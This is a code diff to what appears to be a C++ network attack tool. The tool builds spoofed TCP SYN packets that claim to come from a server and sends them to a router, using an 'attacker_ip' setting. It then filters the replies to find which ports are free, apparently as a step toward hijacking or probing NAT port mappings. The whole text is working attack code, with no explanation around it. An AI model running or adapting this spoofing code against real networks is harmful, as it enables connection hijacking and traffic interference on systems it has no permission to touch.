@@ -35,7 +35,7 @@ int main(int argc, char **argv) {
               .attacker_ip = 0x0af40180,
               .ttl_drop = 3,
           },
-      .scan_port = 38088,
+      .scan_port = 40917,
       .timeout = std::chrono::milliseconds(1000),
       .packet_delay = std::chrono::milliseconds(500),
       .packet_redundancy = 2,
@@ -81,23 +81,35 @@ static RunStatus run(Configuration &config) {
                    });
 
   // Send a spoofed packet from the server to the router
-  send_pkt(config, TCPPacket{
-                       .src = config.topology.server_addr,
-                       .dst = router_addr,
-                       .seqno = server_isn,
-                       .ackno = attacker_isn + 1,
-                       .syn = true,
-                       .fin = false,
-                   });
+  TCPPacket spoofed_to_router{
+      .src = config.topology.server_addr,
+      .dst = router_addr,
+      .seqno = server_isn,
+      .ackno = attacker_isn + 1,
+      .syn = true,
+      .fin = false,
+  };
+  send_pkt(config, spoofed_to_router);
+  // The response we get back will have the destination changed. Remember that
+  // and check incoming packets against it.
+  TCPPacket spoofed_to_attacker = spoofed_to_router;
+  spoofed_to_attacker.dst = attacker_addr;
 
-  // Check to see if we actually received it
-  std::optional<TCPPacket> response = config.interface.receive(config.timeout);
+  // Check to see if we actually received it. Make sure the attributes of the
+  // packet match what we're expecting, otherwise, it could've been from an old
+  // probe.
+  std::optional<TCPPacket> response = config.interface.receive(
+      [&spoofed_to_attacker](const TCPPacket &pkt) -> bool {
+        // Ignore reset packets
+        if (pkt.rst)
+          return false;
+        // Check that all the attributes match exactly, except for the TTL field
+        return pkt == spoofed_to_attacker;
+      },
+      config.timeout);
 
-  // If we didn't get anything, it means someone else is using this port.
-  // Heavily check to make sure we don't false positive.
-  if (!response.has_value() or response->seqno != server_isn or
-      !response->ackno.has_value() or
-      response->ackno.value() != attacker_isn + 1) {
+  // If we didn't get anything, it means someone else is using this port
+  if (!response.has_value()) {
     return RunStatus::OCCUPIED;
   }
   // Otherwise, we have this port free. We don't need to do any cleanup since
